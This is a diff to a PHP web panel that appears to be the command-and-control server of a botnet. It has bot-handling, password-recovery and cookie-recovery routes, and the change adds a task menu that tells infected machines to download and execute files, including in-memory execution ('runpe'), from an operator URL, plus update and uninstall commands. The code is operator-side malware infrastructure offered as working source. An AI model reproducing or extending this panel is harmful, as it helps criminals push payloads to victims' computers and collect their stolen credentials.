@@ -6,7 +6,7 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 $installer = true;
 $loadedVersion = "2.0";
-
+$pluginSetting_Tabs = array();
 
 $navigation = array();
 if (file_exists(__DIR__ . '/../../config.php')) {
@@ -28,6 +28,14 @@ function get_plugin_include_dir($pluginName){
     return $GLOBALS["foundPlugins"][$pluginName]["includeDir"];
 }
 
+function register_settings_tab($name,$bodyhtml,$includeDir = ""){
+
+    $GLOBALS["pluginSetting_Tabs"][] = array(
+        "name" => $name,
+        "body" => $bodyhtml,
+        "includeDir" => $includeDir,
+    );
+}
 
 
 
@@ -39,16 +47,54 @@ require __DIR__ . '/src/Controllers/Public/BotHandler.class.php';
 require __DIR__ . '/src/Controllers/Public/Install.class.php';
 require __DIR__ . '/src/Controllers/Public/Update.class.php';
 require __DIR__ . '/src/Controllers/Public/Recovery.class.php';
-require __DIR__ . '/src/Controllers/Public/OrderApi.class.php';
+//require __DIR__ . '/src/Controllers/Public/OrderApi.class.php';
 
 $tpl = new Smarty;
 $router = new \Bramus\Router\Router();
 
+$task_configuration = array(
+    "dande" => array(
+        "name" => "Download & Execute",
+        "command" => "dande",
+        "placeholder" => "http://yourdomainorip.com/path/to/file.exe",
+    ),
+    "runpe" => array(
+        "name" => "Download & Execute in Memory",
+        "command" => "runpe",
+        "placeholder" => "http://yourdomainorip.com/path/to/file.exe",
+    ),
+    "update" => array(
+        "name" => "Update",
+        "command" => "update",
+        "placeholder" => "http://yourdomainorip.com/path/to/file.exe",
+    ),
+    "uninstall" => array(
+        "name" => "Uninstall",
+        "command" => "uninstall",
+    ),
 
+);
 
 $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
 $statementConfig->execute(array("1"));
 $config = $statementConfig->fetch();
+
+
+
+
+$foundPlugins = array();
+foreach ( array_diff(scandir(__DIR__."/plugins"), array('.', '..'))  as $pluginName){
+
+    $foundPlugins[$pluginName] = array(
+        "name" => $pluginName,
+        "includeDir" => "/versions/".$GLOBALS["loadedVersion"]."/plugins/".$pluginName."/",
+        "active" =>(strpos($config["plugins"], $pluginName) != false) ? "1" : "0",
+    );
+
+    if($foundPlugins[$pluginName]["active"] == "1"){
+        include(__DIR__."/plugins/".$pluginName."/".$pluginName.".php");
+    }
+}
 
 
 if (!$installer) {
@@ -72,29 +118,10 @@ if (!$installer) {
     $router->all('/doUpdate', 'Update@doUpdate');
     $router->all('/passwordrecovery', 'Recovery@passwordrecovery');
     $router->all('/cookierecovery', 'Recovery@cookierecovery');
-    $router->all('/checkfunctions', 'OrderApi@checkFunctions');
-    $router->all('/createoder', 'OrderApi@createoder');
-    $router->all('/checkorder', 'OrderApi@checkorder');
-    $router->all('/detils', 'OrderApi@detils');
+
 
 } else {
     $router->all('/install', 'install@index');
-}
-
-
-
-$foundPlugins = array();
-foreach ( array_diff(scandir(__DIR__."/plugins"), array('.', '..'))  as $pluginName){
-
-    $foundPlugins[$pluginName] = array(
-        "name" => $pluginName,
-        "includeDir" => "/versions/".$GLOBALS["loadedVersion"]."/plugins/".$pluginName."/",
-        "active" =>(strpos($config["plugins"], $pluginName) != false) ? "1" : "0",
-    );
-
-    if($foundPlugins[$pluginName]["active"] == "1"){
-        include(__DIR__."/plugins/".$pluginName."/".$pluginName.".php");
-    }
 }
 
 
@@ -113,6 +140,10 @@ $router->run(function () use ($tpl) {
     $templateDir = $GLOBALS["template"][0] . "/" . $GLOBALS["template"][1] . ".tpl";
     $GLOBALS["tpl"]->assign("includeDir", "/versions/".$GLOBALS["loadedVersion"]."/templates/".$GLOBALS["config"]["template"]."/");
     $GLOBALS["tpl"]->assign("navRegistrations", $GLOBALS["navigation"]);
+    $GLOBALS["tpl"]->assign("task_configuration", $GLOBALS["task_configuration"]);
+    $GLOBALS["tpl"]->assign("pluginSetting_Tabs", $GLOBALS["pluginSetting_Tabs"]);
+    //var_dump($GLOBALS["pluginSetting_Tabs"]);
+   // die();
     $tpl->display($templateDir);
 });
 
